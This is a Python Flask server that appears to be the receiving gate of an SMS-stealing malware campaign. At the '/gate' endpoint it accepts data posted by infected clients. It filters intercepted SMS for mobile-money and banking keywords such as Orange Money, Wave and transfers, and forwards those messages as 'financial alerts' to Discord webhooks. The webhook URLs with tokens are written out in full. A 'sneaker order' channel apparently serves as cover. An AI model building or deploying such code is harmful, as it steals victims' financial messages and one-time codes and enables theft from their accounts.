import os
from flask import Flask, request, jsonify
import requests
import time

app = Flask(__name__)

# --- CONFIGURATION DES SALONS ---
WEBHOOKS = {
    "COMMANDE": "https://discord.com/api/webhooks/1462097772353421537/EtSxGaWGRPbn6wOH_a14if5XWaKD52aovBHJLz1gpxCVGuX4PwwogxlTy2v-Z74pfayR",
    "VIP_CHAT": "https://discord.com/api/webhooks/1462098199576842468/9Ty7sTNkj9SJLuyvl71sSKY3_IajGgFtL5QftLqKTGO2TfdyMQyCKGgcEXhk3M74vawp",
    "LOGS": "https://discord.com/api/webhooks/1462099070356164469/XFaaqy3Q3V-nevi1scEHIW7a1z1E-09uq5t6WLjXxPY61h6VtEvl3b-WWe_yX4Z8PAJE"
}

SECRET_KEY = "ESCANOR_PRO_2024" # Clé de chiffrement partagée

@app.route('/gate', methods=['POST'])
def gate():
    # Vérification du badge de sécurité
    if request.headers.get('X-Escanor-Auth') != SECRET_KEY:
        return "Accès Refusé", 403

    data = request.get_json()
    msg_type = data.get('y') # Le type (SMS, CHAT, COMMANDE)
    content = data.get('z')  # Le message
    user = data.get('x')     # L'identifiant client

    # 1. FILTRE FINANCIER AUTOMATIQUE
    # Si le SMS contient des mots liés à l'argent, il va direct en VIP
    mots_cles = ["orange money", "wave", "banque", "virement", "transfert", "reçu"]
    if msg_type == "SMS" and any(mot in content.lower() for mot in mots_cles):
        target = WEBHOOKS["VIP_CHAT"]
        message = f"💰 **ALERTE FINANCIÈRE**\n👤 De: {user}\n📩 Message: {content}"
    
    # 2. CHAT VIP ÉPHÉMÈRE
    elif msg_type == "CHAT":
        target = WEBHOOKS["VIP_CHAT"]
        message = f"💬 **CHAT VIP** (Expire dans 24h)\n👤 {user}: {content}"
    
    # 3. COMMANDES BANALES (Sneakers)
    elif msg_type == "COMMANDE":
        target = WEBHOOKS["COMMANDE"]
        message = f"👟 **ACHAT CLASSIQUE**\n👤 {user}: {content}"
    
    else:
        target = WEBHOOKS["LOGS"]
        message = f"⚙️ Log: {content}"

    requests.post(target, json={"content": message})
    return jsonify({"status": "reçu"}), 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
